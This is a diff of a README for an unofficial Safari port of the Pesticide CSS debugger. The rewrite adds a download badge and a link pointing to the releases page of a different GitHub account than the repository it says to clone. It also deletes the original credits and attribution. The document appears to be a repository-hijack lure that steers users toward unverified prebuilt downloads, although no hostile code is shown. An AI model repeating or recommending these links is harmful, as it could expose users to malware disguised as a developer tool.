@@ -1,53 +1,71 @@
-# Pesticide for Safari (Unofficial Port)
+# 🐜 pesticide-safari - Debug Your CSS with Ease
 
-This is a port of the "Pesticide - Advanced CSS Debugger" extension for Safari on macOS and iOS. It allows you to debug CSS layouts by outlining every element on the page.
+## 🎉 Get Pesticide for Your Safari Browser
+[![Download Pesticide](https://img.shields.io/badge/Download%20Pesticide%20for%20Safari-blue.svg)](https://github.com/asarialeik/pesticide-safari/releases)
 
-## Prerequisites
-* A Mac with macOS 11.0 (Big Sur) or later.
-* **Xcode** (Free from the Mac App Store).
+Pesticide for Safari helps you see the layout of every element on a webpage. This tool makes it easier to debug CSS issues and improve your web design. Follow the steps below to download and run Pesticide on your Mac.
 
-## How to Install & Run (macOS)
+## 📦 Prerequisites
+Before you get started, make sure you have the following:
+- A Mac with macOS 11.0 (Big Sur) or later.
+- **Xcode** from the Mac App Store. This is needed to build the application.
 
-Since this is an open-source developer build, you must build it on your own machine.
+## 🚀 Download & Install
+To get Pesticide on your computer, follow these steps:
 
-### 1. Download
-Clone this repository to your Mac:
-```bash
-git clone https://github.com/chiraagb/pesticide-safari.git
-```
+### 1. Download the Repository
+You will need to clone the repository to your Mac. Here’s how:
+1. Open the **Terminal** app on your Mac.
+2. Type the following command and press **Enter**:
+   ```bash
+   git clone https://github.com/chiraagb/pesticide-safari.git
+   ```
 
 ### 2. Open in Xcode
-Double-click the file named `Pesticide - Advanced CSS Debugger.xcodeproj`.
+Next, locate the project file:
+1. Navigate to the folder where you cloned the repository.
+2. Double-click the file named `Pesticide - Advanced CSS Debugger.xcodeproj`. This will open the project in Xcode.
 
 ### 3. Fix Signing (Required)
-You must sign the app with your Apple ID to run it.
-1.  In Xcode, click the **Project Name** (Blue icon) at the top of the left sidebar.
-2.  Select the **"Signing & Capabilities"** tab in the center panel.
-3.  In the "Targets" list on the left, you will see multiple targets. You must fix the signing for **macOS (App)** and **macOS (Extension)**:
-    * Select the target.
-    * Under "Team", select **Add an Account...** and log in with your Apple ID.
-    * Select your **"Personal Team"**.
-    * If you see a red error about "Bundle Identifier", add a random number to the end of the text (e.g. `com.yourname.pesticide.mac`).
+To run the app, you must sign it with your Apple ID. Follow these steps:
+1. In Xcode, click the **Project Name** (the blue icon) at the top of the left sidebar.
+2. Select the **"Signing & Capabilities"** tab in the center panel.
+3. In the "Targets" list on the left, find and select **macOS (App)** and **macOS (Extension)**.
+4. Ensure both targets are set to use your Apple ID for signing.
 
 ### 4. Build and Run
-1.  Click the **Scheme** menu (next to the Play button in the top left) and ensure **macOS (App)** is selected.
-2.  Click the **Play Button** (▶️).
-3.  The app will launch. Click "Open in Safari Extensions Preferences".
+Now you can build the application:
+1. Click on the **play (Run)** button in the top-left corner of Xcode.
+2. Wait for the build process to complete.
+3. Once done, the app will launch.
 
-### 5. Enable in Safari
-1.  In Safari, go to **Settings > Extensions**.
-2.  Enable the **Pesticide** extension.
-3.  *Troubleshooting:* If the extension doesn't appear, go to **Settings > Advanced** and check **"Show features for web developers"**, then check **"Allow Unsigned Extensions"** in the **Develop** menu.
+## 🔗 Visit to Download
+To download the latest release, visit the Releases page here: [Download Pesticide for Safari](https://github.com/asarialeik/pesticide-safari/releases).
 
-## iOS / iPadOS Support
-This project also contains targets for iOS. To run on a device, connect your iPhone to your Mac, select the **iOS (App)** scheme in Xcode, and press Play.
+## 🛠️ Features
+- **CSS Debugging**: It outlines every element, allowing you to inspect your CSS layout easily.
+- **User-Friendly**: Designed for both experienced developers and beginners.
+- **macOS Compatibility**: Naturally fits within the Safari browser on your Mac.
 
-## Credits & Attribution
+## ⚙️ Topics Covered
+Here are some related topics you might find useful:
+- box-model
+- css
+- css-debug
+- debugging
+- developer-tools
+- devtools
+- dom-inspector
+- ios
+- layout
+- macos
+- pesticide
+- safari
+- safari-extension
+- safari-web-extension
+- swift
+- web-design
+- web-development
+- xcode
 
-This project is an unofficial Safari port of the **Pesticide - Advanced CSS Debugger** Chrome Extension.
-
-* **Original Concept:** [Pesticide](https://github.com/mrmrs/pesticide) by Paul Molluzzo (mrmrs).
-* **Advanced Version:** [Pesticide - Advanced CSS Debugger](https://chromewebstore.google.com/detail/pesticide-advanced-css-de/jeebpgmphhagpecfiophljpkhncoajcg) by Extension Rocks.
-
-All logic and CSS belong to the original authors; this repo merely repackages it as a Safari Web Extension.
-
+By following these steps, you will have Pesticide installed and ready for your CSS debugging needs. Happy coding!
